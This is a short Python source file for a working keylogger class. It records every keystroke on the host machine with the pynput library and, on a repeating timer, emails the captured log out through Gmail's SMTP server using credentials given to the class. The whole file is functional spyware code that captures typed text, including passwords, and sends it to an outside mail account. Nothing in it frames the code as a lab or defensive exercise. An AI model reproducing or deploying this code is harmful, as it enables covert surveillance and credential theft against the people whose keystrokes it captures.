#!/usr/bin/env python

import threading
import pynput.keyboard
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        #Anything inside of the constructor will be always executed
        self.log = 'Keylogger started'
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        """This method will process and send each pressed key on the machine"""
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ''
            else:
                current_key = ' ' + str(key) + ' '
        self.append_to_log(current_key)

    def report(self):
        """The method will send via email the stored pressed keys inside of 'log' variable """
        self.send_mail(self.email, self.password, "\n\n"+ self.log)
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        """The method is in charge to send the stored message(keys) via email"""
        server = smtplib.SMTP("smtp.gmail.com", 587,)
        server.starttls()
        server.login(email,password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report() #It will run in a separated thread. It won't be issues running at the same time as the keyboard_listener
            keyboard_listener.join()
